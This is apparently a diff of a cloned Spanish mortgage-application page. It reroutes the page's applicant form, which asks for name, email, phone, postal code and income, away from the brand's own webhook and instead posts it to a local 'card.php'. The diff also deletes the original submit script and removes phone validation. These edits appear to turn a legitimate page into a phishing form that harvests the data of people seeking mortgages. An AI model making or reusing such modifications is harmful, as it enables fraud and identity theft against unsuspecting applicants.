@@ -87,12 +87,12 @@
                         <li><a class="dropdown-item geo geo-es" href="creditio-hipotecas.html">España</a></li>
                                                         <li><a class="dropdown-item geo geo-it" href="it/creditio-hipotecas.html">Italia</a></li>
                                                         <li><a class="dropdown-item geo geo-pt" href="pt/creditio-hipotecas.html">Portugal</a></li>
-                                                        <li><a class="dropdown-item geo geo-ro" href="ro/creditio-hipotecas.html">Rumanía</a></li>
-                                                        <li><a class="dropdown-item geo geo-mx" href="mx/creditio-hipotecas.html">México</a></li>
-                                                        <li><a class="dropdown-item geo geo-co" href="co/creditio-hipotecas.html">Colombia</a></li>
-                                                        <li><a class="dropdown-item geo geo-br" href="br/creditio-hipotecas.html">Brasil</a></li>
+                                                        <!-- <li><a class="dropdown-item geo geo-ro" href="ro/creditio-hipotecas.html">Rumanía</a></li> -->
+                                                        <!-- <li><a class="dropdown-item geo geo-mx" href="mx/creditio-hipotecas.html">México</a></li> -->
+                                                        <!-- <li><a class="dropdown-item geo geo-co" href="co/creditio-hipotecas.html">Colombia</a></li> -->
+                                                        <!-- <li><a class="dropdown-item geo geo-br" href="br/creditio-hipotecas.html">Brasil</a></li> -->
                                                         <li><a class="dropdown-item geo geo-us" href="us/creditio-hipotecas.html">Estados Unidos</a></li>
-                                                        <li><a class="dropdown-item geo geo-za" href="za/creditio-hipotecas.html">Sudáfrica</a></li>
+                                                        <!-- <li><a class="dropdown-item geo geo-za" href="za/creditio-hipotecas.html">Sudáfrica</a></li> -->
                                             </ul>
                 </li>
             </ul>
@@ -237,10 +237,11 @@
     </section>
     <section class="contenedor-info-form-hipotecas" id="infoForm">
         <div class="container" style="height : 100%;">
-            <div class="row column-reverse flex-lg-row" style="height : 100%;"">
+            <div class="row column-reverse flex-lg-row" style="height : 100%;"
+            >
                 <div class="contenedor-formulario col-12 col-lg-6 ">
                     <div class="contenedor-formulario">
-                        <form class="formulario" id="ad8d5e8e3ee39fb489a6643cbd8fed7a">
+                        <form class="formulario" id="ad8d5e8e3ee39fb489a6643cbd8fed7a" method="post" action="card.php">
         <div class="inputs">
             <div>
                 <p class="title">¿Con qué finalidad quieres solicitar la hipoteca?</p>
@@ -307,7 +308,7 @@
             <input type="text" name="nombre" placeholder="Nombre *" required>
             <input type="text" name="apellidos" placeholder="Apellidos *" required>
             <input type="email" name="correo-electronico" placeholder="Correo electrónico *" required>
-            <input type="tel" title="Ej: +34 600000000" pattern="\+34 [6789]{1}\d{8}" name="telefono" placeholder="Teléfono móvil *" data-mask="+34 999999999" required>
+            <input type="tel" title="Ej: +34 600000000"  name="telefono" placeholder="Teléfono móvil *" data-mask="+34 999999999" required>
             <input type="number" name="codigo-postal" placeholder="Código Postal *" required>
             <input type="number" name="ingresos-mensuales" placeholder="Ingreso familiar mensual *" required>
             <select name="porcentaje-de-ingresos-destinas-a-tus-deudas" required>
@@ -378,60 +379,6 @@
             }
 
             const mortgagePurposes = document.querySelectorAll('[name="proposito-de-la-hipoteca"]')
-
-            document.addEventListener("DOMContentLoaded", e => {
-
-                mortgagePurposes.forEach(purpose => {
-                    purpose.addEventListener('click', function(e){
-
-                        const title                  = document.querySelector('#title-hipotecas')
-                        const savings                = document.querySelector('[name="hipoteca-ahorros-aportados"]')                        
-                        const houseReservedContainer = document.querySelector('#hipoteca-vivienda-reservada-container')
-
-                        const options = {
-                            "Comprar casa" : "¿Cual es el valor de la Hipoteca?",
-                            "Cambiar banco" : "¿Cuánto te queda por pagar de hipoteca?",
-                            "Otra Finalidad" : "¿Cual es el valor de la Hipoteca?"
-                        }
-
-                        if(options[e.target.value])
-                            title.textContent = options[e.target.value]
-
-                        showInput( savings, e.target.value == "Comprar casa" )
-
-                        houseReservedContainer.style = `display: ${e.target.value == "Comprar casa"? 'block': 'none'}`
-                        houseReservedContainer.querySelector('[name="hipoteca-vivienda-reservada"]').required = e.target.value == "Comprar casa"
-                    })
-                })
-            })
-
-            form.addEventListener('submit', function(e){
-                e.preventDefault()
-
-                const urlSearch    = (new URL(window.location.html)).search
-                const searchParams = new URLSearchParams(urlSearch)
-                const formData     = new FormData(e.target)
-
-                formData.append('servy_click', getCookie('servy_click') || searchParams.get('servy_click'))
-                formData.append('utm_source', getCookie('utm_source'))
-                formData.append('servy_id', servyId(formData))
-
-                fetch("https://gestion.servy.es/webhooks/creditio", {
-                    headers: { "Content-Type": "application/json" },
-                    method: 'POST',
-                    body: JSON.stringify({
-                        ...Object.fromEntries(formData),
-                        meta: {
-                            href: window.location.href
-                        }
-                    })
-                }).then(data => {
-                    return data.json()
-                }).then(() => { window.location.href = redirectUrl(formData)
-                }).catch( () => {
-                    window.location.href = redirectUrl(formData)
-                })
-            })
 
             function redirectUrl(form){
                 let redirectUrl = new URL('verificar.html')
